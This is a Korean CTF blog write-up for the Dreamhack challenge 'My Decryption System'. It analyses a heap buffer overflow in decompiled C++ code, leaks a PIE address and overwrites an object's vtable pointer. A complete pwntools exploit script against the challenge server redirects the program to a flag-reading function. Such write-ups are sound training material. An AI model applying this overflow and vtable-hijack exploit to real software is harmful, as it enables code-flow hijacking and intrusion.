---
title: "[Dreamhack] My Decryption System"
date: 2026-04-10
categories: [CTF/Wargame]
tags: [Wargame]
description: "lv6-My_Decryption_System"
---
![[Dreamhack] My Decryption System](/assets/img/posts/my-decryption-system/2026-04-10-my-decryption-system-1.png)

```python
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 v3; // rbx
  const char *v4; // rax
  int v6; // [rsp+Ch] [rbp-84h]
  __int64 v7; // [rsp+10h] [rbp-80h]
  const char *v8; // [rsp+18h] [rbp-78h]
  __int64 v9; // [rsp+28h] [rbp-68h]
  _DWORD v10[6]; // [rsp+30h] [rbp-60h] BYREF
  __int64 v11; // [rsp+48h] [rbp-48h]
  _DWORD v12[6]; // [rsp+50h] [rbp-40h] BYREF
  __int64 v13; // [rsp+68h] [rbp-28h]
  unsigned __int64 v14; // [rsp+78h] [rbp-18h]

  v14 = __readfsqword(0x28u);
  strcpy((char *)v10, "0123456789abcdef");
  BYTE1(v10[4]) = 0;
  HIWORD(v10[4]) = 0;
  v10[5] = 0;
  v11 = 0LL;
  strcpy((char *)v12, "0000000000000000");
  BYTE1(v12[4]) = 0;
  HIWORD(v12[4]) = 0;
  v12[5] = 0;
  v13 = 0LL;
  v7 = operator new[](0x20uLL);
  v8 = (const char *)operator new[](0x20uLL);
  sub_191E(32LL, a2);
  sub_19E6(v10, 16LL);
  v3 = operator new(0x30uLL);
  sub_1474(v3, v10, v12);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          v6 = sub_1A38();
          if ( v6 != 1 )
            break;
          printf("ciphertext: ");
          v9 = (int)sub_1983(0LL, v7, 64LL);
          sub_171C(v3, v7, v9, v8);
          printf("plaintext: %s\n", v8);
        }
        if ( v6 != 2 )
          break;
        printf("new iv: ");
        sub_1983(0LL, v12, 16LL);
        (**(void (__fastcall ***)(__int64, _DWORD *))v3)(v3, v12);
      }
      if ( v6 != 3 )
        break;
      v4 = (const char *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 8LL))(v3);
      printf("iv: %s\n", v4);
    }
    if ( v6 == 4 )
      break;
    puts("invalid option");
  }
  puts("bye!");
  return 0LL;
}
```

```plain text
주요 변수:

v3 (rbx): Crypto 객체 포인터입니다.
operator new(0x30uLL)로 48바이트가 할당되었습니다.
C++ 클래스 인스턴스이므로 첫 8바이트는 vtable 포인터일 확률이 매우 높습니다.

v7: Ciphertext(입력값) 버퍼 포인터. new char[32]로 32바이트 할당.

v8: Plaintext(출력값) 버퍼 포인터. new char[32]로 32바이트 할당.

v10: Key ("0123456789abcdef")

v12: IV ("0000000000000000")

메뉴 구성 (while(1) 루프):

Decryption (1번): 사용자가 입력한 내용을 sub_171C를 통해 복호화합니다.

Update IV (2번): 새로운 IV를 입력받아 객체(v3) 내의 IV를 업데이트합니다.\
가상 함수 호출((**v3)(...))이 일어납니다.

Print IV (3번): 현재 IV를 출력합니다. 역시 가상 함수 호출이 일어납니다.

Exit (4번): 종료.
```

### C++ 클래스 

 1. C++ 클래스는 사실 '구조체'입니다.

 C언어에서 구조체(struct)를 만들면 멤버 변수들이 메모리에 차곡차곡 쌓이죠? C++의 클래스(Class)도 똑같습니다.
operator new(0x30) == malloc(48)


2. 그런데 '가상 함수(Virtual Function)'가 있다면?
문제는 C++의 다형성(Polymorphism) 때문에 생깁니다. C++에서는 자식 클래스가 부모 클래스의 함수를 덮어쓰기(Override) 할 수 있습니다.
컴파일러 입장에서는 이 객체가 함수를 호출할 때, "어떤 함수를 실행해야 할지" 실행 시점(Runtime)에 결정해야 합니다. 이를 위해 컴파일러는 객체를 만들 때 몰래 비밀 수첩 하나를 끼워 넣습니다.
그게 바로 **vptr (Virtual Pointer)**입니다

.
3. 메모리 구조 시각화
여러분이 분석 중인 v3 객체(48바이트)의 메모리 모습은 실제로 이렇습니다:


4. 정상적인 실행 흐름 vs 해킹된 흐름
이 프로그램이 함수를 호출하는 과정((**v3)(...))을 풀어서 쓰면 다음과 같습니다.

1. 프로그램: "v3 객체의 함수를 실행하자!"
2. 참조: v3의 맨 앞 8바이트(vptr)를 읽음 -> 0xAAAA (진짜 vtable 주소)
3. 이동: 0xAAAA로 감 -> 거기에 Encrypt, Decrypt 등의 진짜 함수 주소가 적혀 있음.
4. 실행: 진짜 함수 실행.

취약점

```c++
  v7 = operator new[](0x20uLL); //힙에 32바이트 할당
  v8 = (const char *)operator new[](0x20uLL); //힙에 32바이트 할당
  ...
  
  v9 = (int)sub_1983(0LL, v7, 64LL); // 64바이트 read -> 힙 버퍼 오버플로우 발생
  sub_171C(v3, v7, v9, v8); //역시 64바이트 -> 힙 버퍼 오버플로우 
```

```assembly
endbr64
push    rbp
mov     rbp, rsp
push    r12
push    rbx
add     rsp, 0FFFFFFFFFFFFFF80h
mov     rax, fs:28h
mov     [rbp+var_18], rax
xor     eax, eax
mov     [rbp+var_85], 0
mov     rax, 3736353433323130h
mov     rdx, 6665646362613938h
mov     qword ptr [rbp+var_60], rax
mov     qword ptr [rbp+var_60+8], rdx
mov     qword ptr [rbp+var_60+10h], 0
mov     [rbp+var_48], 0
mov     rax, 3030303030303030h
mov     rdx, 3030303030303030h
mov     qword ptr [rbp+var_40], rax
mov     qword ptr [rbp+var_40+8], rdx
mov     qword ptr [rbp+var_40+10h], 0
mov     [rbp+var_28], 0
mov     edi, 20h ; ' '  ; unsigned __int64
call    __Znam          ; operator new[](ulong)
mov     [rbp+var_80], rax
mov     edi, 20h ; ' '  ; unsigned __int64
call    __Znam          ; operator new[](ulong)
```

힙순서 : v7 → v8 → v3

```assembly
낮은 주소 (Low Address)
-----------------------------
[ 1. v7 청크 (32 bytes) ]  <--- 사용자가 입력하는 곳 (최대 64바이트 입력 가능)
-----------------------------
[ 2. v8 청크 (32 bytes) ]  <--- 복호화된 데이터가 저장되는 곳 (최대 64바이트 저장됨)
-----------------------------
[ 3. v3 청크 (48 bytes) ]  <--- Crypto 객체 (vtable 포함)
-----------------------------
높은 주소 (High Address)
```

v3

NULL이 없는 데이터로 v8을 꽉 채우고, v3 청크 헤더까지 덮어쓰면

—> vptr은 바이너리에 존재. PIE base leak가능, GOT 테이블 주소 계산

```assembly
0x7fffffffdb90: 0x00007ffff7b68e60      0x00007fff00b68ae0
0x7fffffffdba0: 0x000055555556aeb0      0x000055555556aee0
0x7fffffffdbb0: 0x0000000000000000      0xf6cf4f9302806900
0x7fffffffdbc0: 0x3736353433323130      0x6665646362613938
0x7fffffffdbd0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbe0: 0x3030303030303030      0x3030303030303030
0x7fffffffdbf0: 0x0000000000000000      0x0000000000000000
0x7fffffffdc00: 0x00007ffff7b680c8      0xf6cf4f9302806900
0x7fffffffdc10: 0x0000000000000000      0x00007fffffffdd38
0x7fffffffdc20: 0x0000000000000001      0x00007ffff771fd90
```

```assembly
 0x555555555b5e    mov    qword ptr [rbp - 0x80], rax     [0x7fffffffdba0] <= 0x55555556aeb0 ◂— 0
   0x555555555b62    mov    edi, 0x20                       EDI => 0x20
   0x555555555b67    call   operator new[](unsigned long)@plt <operator new[](unsigned long)@plt>

 ► 0x555555555b6c    mov    qword ptr [rbp - 0x78], rax     [0x7fffffffdba8] <= 0x55555556aee0 ◂— 0
```

v7 → 0x000055555556aeb0

v8 → 0x000055555556aee0

```assembly
 0x555555555b86    mov    edi, 0x30     EDI => 0x30
 0x555555555b8b    call   operator new(unsigned long)@plt <operator new(unsigned long)@plt>

 0x555555555b90    mov    rbx, rax              RBX => 0x55555556af10 ◂— 0
```

v3 → 0x55555556af10

```assembly
pwndbg> x/40x 0x000055555556aeb0
0x55555556aeb0: 0x0000000000000000      0x0000000000000000
0x55555556aec0: 0x0000000000000000      0x0000000000000000
0x55555556aed0: 0x0000000000000000      0x0000000000000031
0x55555556aee0: 0x0000000000000000      0x0000000000000000
0x55555556aef0: 0x0000000000000000      0x0000000000000000
0x55555556af00: 0x0000000000000000      0x0000000000000041
0x55555556af10: 0x0000555555557cb0      0x000055555556af50
0x55555556af20: 0x000055555556af70      0x000055555556af90
0x55555556af30: 0x000055555556afb0      0x000055555556b0b0
0x55555556af40: 0x0000000000000000      0x0000000000000021
0x55555556af50: 0x76b9e7347a46ce33      0xbb439face8f4e48b
0x55555556af60: 0x0000000000000000      0x0000000000000021
0x55555556af70: 0x3030303030303030      0x3030303030303030
0x55555556af80: 0x0000000000000000      0x0000000000000021
0x55555556af90: 0x0000000000000000      0x0000000000000000
0x55555556afa0: 0x0000000000000000      0x0000000000000101
```

0x55555556af18 →0x000055555556af50 → key → 무작위값이 들어가있음

0x55555556af20 → 0x000055555556af70 → iv

v8부터 48바이트 → vptr

즉 입력값으로 b’A’ * 48을 주면 PIE의 한 주소를 leak 가능 

```c
 if ( v6 != 3 )
        break;
      v4 = (const char *)(*(__int64 (__fastcall **)(_QWORD *))(*v3 + 8LL))(v3);
      printf("iv: %s\n", v4);
    }
```

rdi : v3의 주소 

v3 + 8 : key pointer

vtable

```rust
data.rel.ro:0000000000003CB0 off_3CB0        dq offset sub_1818      ; DATA XREF: sub_1474+18↑o
.data.rel.ro:0000000000003CB0                                         ; sub_1574+10↑o
.data.rel.ro:0000000000003CB8                 dq offset sub_1846
.data.rel.ro:0000000000003CC0                 dq offset sub_185C
.data.rel.ro:0000000000003CC8                 dq offset sub_1872
```

sub_1872  함수

```rust
000000001872                 endbr64
.text:0000000000001876                 push    rbp
.text:0000000000001877                 mov     rbp, rsp
.text:000000000000187A                 sub     rsp, 30h
.text:000000000000187E                 mov     [rbp+var_28], rdi
.text:0000000000001882                 lea     rax, modes      ; "r"
.text:0000000000001889                 mov     rsi, rax        ; modes
.text:000000000000188C                 lea     rax, filename   ; "flag"
.text:0000000000001893                 mov     rdi, rax        ; filename
.text:0000000000001896                 call    _fopen
.text:000000000000189B                 mov     [rbp+stream], rax
.text:000000000000189F                 cmp     [rbp+stream], 0
.text:00000000000018A4                 jnz     short loc_18BF
.text:00000000000018A6                 lea     rax, s          ; "Cannot open file."
.text:00000000000018AD                 mov     rdi, rax        ; s
.text:00000000000018B0                 call    _puts
.text:00000000000018B5                 mov     edi, 539h       ; status
.text:00000000000018BA                 call    _exit
```

```rust
__int64 __fastcall sub_1872(_QWORD *a1)
{
  FILE *stream; // [rsp+18h] [rbp-18h]
  char *s; // [rsp+20h] [rbp-10h]
  __int64 v4; // [rsp+28h] [rbp-8h]

  stream = fopen("flag", "r");
  if ( !stream )
  {
    puts("Cannot open file.");
    exit(1337);
  }
  s = (char *)operator new[](0x31uLL);
  v4 = operator new[](0x31uLL);
  fgets(s, 49, stream);
  fclose(stream);
  sub_1620(a1, (__int64)s, 0x30uLL, v4);
  return v4;
}
```

flag를 읽어서 출력해주는 함수

vptr을 +0x10 주소로 조작하여 menu 3 을 할때 flag를 출력하도록 조정

![[Dreamhack] My Decryption System](/assets/img/posts/my-decryption-system/2026-04-10-my-decryption-system-2.png)

값을 넣었는데도 iv 값이 바뀌지 않은 걸 확인할 수 있다. iv → 0000… 으로 고정

![[Dreamhack] My Decryption System](/assets/img/posts/my-decryption-system/2026-04-10-my-decryption-system-3.png)

```c
from pwn import *
import os

#p = process('./prob')
p = remote('host8.dreamhack.games', 24248)
payload = b'A' * 48
p.sendlineafter(b"> ", b"1")
p.sendafter(b'ciphertext:', payload)

p.recvuntil(b"plaintext: ")

#pie leak
p.recv(48) 
pie_leak = p.recv(6)
pie_leak = u64(pie_leak.ljust(8, b'\x00'))


pie_base = pie_leak - 0x3cb0
target = pie_leak + 0x10
print(hex(pie_base))

payload = b'A' * 64
p.sendlineafter(b"> ", b"1")
p.sendafter(b'ciphertext:', payload)

p.recvuntil(b"plaintext: ")

#p4 = DEC(C4) xor C3
#leak =  DEC(C4)
p.recv(48) 
dec_c4 = p.recv(16)

# 1) Garbage = Dec(Overlapped_P1) ^ Old_Block3('A'*16)
# 2) Target  = Dec(Overlapped_P1) ^ New_Block3
# ----------------------------------------------------
# 결론: New_Block3 = Garbage ^ Old_Block3 ^ Target
payload = b'A' * 32
payload += xor(b'A' * 16, dec_c4, (p64(target) + p64(0)))
payload += b'A' * 16
p.sendlineafter(b"> ", b"1")
p.sendafter(b'ciphertext:', payload)

p.sendlineafter(b"> ", b"3")
p.recvuntil(b"iv: ")

encrypted_flag = p.recvline()[:-1]
decrypt_payload = encrypted_flag.ljust(64, b'\x00')

p.sendlineafter(b"> ", b"1")
p.sendafter(b'ciphertext:', decrypt_payload)

p.recvuntil(b"plaintext: ")
real_flag = p.recvline()

print(f"\n[+] FLAG: {real_flag.decode(errors='ignore')}")

p.interactive()
```

쉘 획득

Function PointerOverwrite를 이용한 문제
